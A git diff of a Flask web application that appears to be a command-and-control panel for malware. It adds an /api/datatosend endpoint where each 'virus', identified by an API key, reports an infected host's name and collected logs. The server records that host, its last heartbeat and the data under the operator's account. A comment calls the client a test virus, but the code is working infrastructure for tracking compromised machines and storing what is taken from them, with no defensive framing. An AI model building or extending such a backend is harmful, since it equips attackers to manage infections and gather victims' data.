@@ -1,17 +1,20 @@
 # Note for API, for now internal calls on the webpage will be using /function, while externals will be using /api/function 
-import requests
-import base64
+
 from flask import Blueprint, render_template, request, flash, jsonify, send_file, redirect, url_for, session
 from flask_login import login_required, current_user
+from werkzeug.utils import secure_filename
+from datetime import datetime
 #from .models import Note, ImageSet, Image
 from .models import Virus, Hosts, Archived, CompilingHandler
-import sqlite3
 from . import db
+import sqlite3
 import json
 import os
 import socketio
 import secrets
-from werkzeug.utils import secure_filename
+import requests
+import base64
+
 
 auth = Blueprint('auth', __name__)  # Creating a Blueprint named 'auth'
 
@@ -169,6 +172,7 @@ def heartbeat():
     try:
         # Retrieve the API key from the request
         virus_api = request.headers.get('Authorization')
+        #hostname = request.form.get('host_name')
         print(virus_api)
 
         if not virus_api:
@@ -176,6 +180,9 @@ def heartbeat():
 
         # Check if the virus exists with the provided API key
         virus = Virus.query.filter_by(virus_api=virus_api).first()
+
+
+        #host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()
 
         if not virus:
             return jsonify({'message': 'Invalid API key'}), 404
@@ -189,6 +196,60 @@ def heartbeat():
     except Exception as e:
         print(f"Error in heartbeat: {e}")
         return jsonify({'message': 'Internal server error'}), 500
+
+# Takes log data from the test virus and saves it to the host model, with foregin keys to user.id and virus.id
+@api.route('/api/datatosend', methods=['POST'])
+def datatosend():
+    try:
+        # Debugging the raw JSON data
+        print("JSON data:", request.json)
+
+        virus_api = request.json.get('api_key')
+        data = request.json.get('data')
+        
+        if not virus_api or not data:
+            return jsonify({'message': 'api_key and data are required'}), 400
+        
+        hostname = data.get('host_name')
+        use_case_logs = data.get('data')
+
+        if not hostname or not use_case_logs:
+            return jsonify({'message': 'host_name and data logs are required'}), 400
+        
+        print(f"virus_api = {virus_api}, hostname = {hostname}, logs = {use_case_logs}")
+
+        # Find the virus using the API key
+        virus = Virus.query.filter_by(virus_api=virus_api).first()
+        if not virus:
+            return jsonify({'message': 'Invalid API key'}), 404
+
+        # Check if the host already exists
+        host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()
+
+        if not host:
+            # Create a new host if it doesn't exist
+            host = Hosts(
+                host_name=hostname,
+                last_heartbeat=datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'),
+                user_id=virus.user_id,
+                virus_id=virus.id,
+                log_info=str(use_case_logs)  # Save logs as a string
+            )
+            db.session.add(host)
+        else:
+            # Update existing host
+            host.last_heartbeat = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
+            host.log_info = str(use_case_logs)  # Update logs
+
+        # Commit changes to the database
+        db.session.commit()
+
+        return jsonify({'message': f'Logs saved for host {hostname}', 'status': 'success'}), 200
+
+    except Exception as e:
+        print(f"Error saving logs: {e}")
+        return jsonify({'message': 'Internal server error'}), 500
+
 
 
 #############################
